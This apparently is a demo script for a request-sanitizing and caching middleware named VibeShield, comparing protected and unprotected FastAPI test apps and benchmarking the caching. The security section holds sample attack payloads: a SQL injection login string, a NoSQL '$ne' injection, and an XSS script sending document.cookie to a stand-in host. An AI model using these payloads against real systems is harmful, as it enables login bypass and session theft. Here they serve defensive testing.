import asyncio
import time
import json
import httpx
from fastapi import FastAPI, Request
from src.core import VibeShieldASGIMiddleware

# ==========================================
# 1. MOCK HANDLERS FOR SECURITY SHOWCASE
# ==========================================

async def run_security_showcase():
    print('\n=============================================================')
    print('🕵️ VIBESHIELD SECURITY SANITIZATION SHOWCASE')
    print('=============================================================\n')

    # Setup Unprotected App
    unprotected_app = FastAPI()
    @unprotected_app.post("/login")
    async def login_unprotected(request: Request):
        data = await request.json()
        return {"status": "success", "data": data}

    # Setup Protected App
    protected_app = FastAPI()
    protected_app.add_middleware(VibeShieldASGIMiddleware)
    @protected_app.post("/login")
    async def login_protected(request: Request):
        data = await request.json()
        return {"status": "success", "data": data}

    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=unprotected_app), base_url="http://localhost") as ac_unprotected, \
               httpx.AsyncClient(transport=httpx.ASGITransport(app=protected_app), base_url="http://localhost") as ac_protected:

        # Case A: SQL Injection
        sqli_body = {"username": "admin' OR '1'='1"}
        print('--- CASE A: SQL INJECTION ---')
        print('Raw Payload sent:', json.dumps(sqli_body))
        
        res_before = await ac_unprotected.post("/login", json=sqli_body)
        print('Before VibeShield:', res_before.text)
        
        res_after = await ac_protected.post("/login", json=sqli_body)
        print('After VibeShield: ', res_after.text)
        print()

        # Case B: NoSQL Injection
        nosqli_body = {"password": {"$ne": "admin"}}
        print('--- CASE B: NOSQL INJECTION ---')
        print('Raw Payload sent:', json.dumps(nosqli_body))
        
        res_before = await ac_unprotected.post("/login", json=nosqli_body)
        print('Before VibeShield:', res_before.text)
        
        res_after = await ac_protected.post("/login", json=nosqli_body)
        print('After VibeShield: ', res_after.text)
        print()

        # Case C: XSS Attack
        xss_body = {"comment": "<script>fetch('malicious-site.com?cookie=' + document.cookie)</script>Nice post!"}
        print('--- CASE C: XSS ATTACK ---')
        print('Raw Payload sent:', json.dumps(xss_body))
        
        res_before = await ac_unprotected.post("/login", json=xss_body)
        print('Before VibeShield:', res_before.text)
        
        res_after = await ac_protected.post("/login", json=xss_body)
        print('After VibeShield: ', res_after.text)
        print()

# ==========================================
# 2. PERFORMANCE BENCHMARK
# ==========================================

db_query_count = 0

async def run_performance_benchmark():
    global db_query_count
    print('=============================================================')
    print('🚀 VIBESHIELD PERFORMANCE BENCHMARK (1,000 REQUESTS)')
    print('=============================================================\n')

    # Uncached App
    app_uncached = FastAPI()
    @app_uncached.get("/data")
    async def get_data_uncached():
        global db_query_count
        db_query_count += 1
        await asyncio.sleep(0.002)  # Simulates a 2ms database query
        return {"status": "ok", "data": "query-results", "queryNumber": db_query_count}

    # Cached App
    app_cached = FastAPI()
    app_cached.add_middleware(VibeShieldASGIMiddleware, cache_enabled=True, cache_ttl=10.0)
    @app_cached.get("/data")
    async def get_data_cached():
        global db_query_count
        db_query_count += 1
        await asyncio.sleep(0.002)  # Simulates a 2ms database query
        return {"status": "ok", "data": "query-results", "queryNumber": db_query_count}

    iterations = 1000

    # Benchmark 1: Uncached
    print(f"Running {iterations} requests WITHOUT cache...")
    db_query_count = 0
    start_no_cache = time.perf_counter()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app_uncached), base_url="http://localhost") as client:
        for _ in range(iterations):
            res = await client.get("/data")
            _ = res.text
    end_no_cache = time.perf_counter()
    duration_no_cache = (end_no_cache - start_no_cache) * 1000.0
    queries_no_cache = db_query_count

    print(f"Finished. Duration: {duration_no_cache:.2f} ms")
    print(f"Total Database Queries Executed: {queries_no_cache}\n")

    # Benchmark 2: Cached
    print(f"Running {iterations} requests WITH VibeShield Cache...")
    db_query_count = 0
    start_cache = time.perf_counter()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app_cached), base_url="http://localhost") as client:
        # First request to warm the cache
        res = await client.get("/data")
        _ = res.text
        
        # Blast remaining 999 requests
        for _ in range(1, iterations):
            res = await client.get("/data")
            _ = res.text
            
    end_cache = time.perf_counter()
    duration_cache = (end_cache - start_cache) * 1000.0
    queries_cache = db_query_count

    print(f"Finished. Duration: {duration_cache:.2f} ms")
    print(f"Total Database Queries Executed: {queries_cache}\n")

    # Calculations
    latency_reduction = ((duration_no_cache - duration_cache) / duration_no_cache) * 100
    average_latency_no_cache = duration_no_cache / iterations
    average_latency_cache = duration_cache / iterations

    print('=============================================================')
    print('📊 BENCHMARK SUMMARY RESULTS')
    print('=============================================================')
    print(f"Without Cache Duration: {duration_no_cache:.2f} ms (Avg: {average_latency_no_cache:.4f} ms/req)")
    print(f"With VibeShield Cache:  {duration_cache:.2f} ms (Avg: {average_latency_cache:.4f} ms/req)")
    print(f"Performance Speedup:    {(duration_no_cache / duration_cache):.1f}x faster")
    print(f"Database Latency Cut:   {latency_reduction:.2f}% reduction")
    print(f"Database Load Relieved: {(((queries_no_cache - queries_cache) / queries_no_cache) * 100):.2f}% fewer queries")
    print('=============================================================\n')

async def main():
    await run_security_showcase()
    await run_performance_benchmark()

if __name__ == "__main__":
    asyncio.run(main())
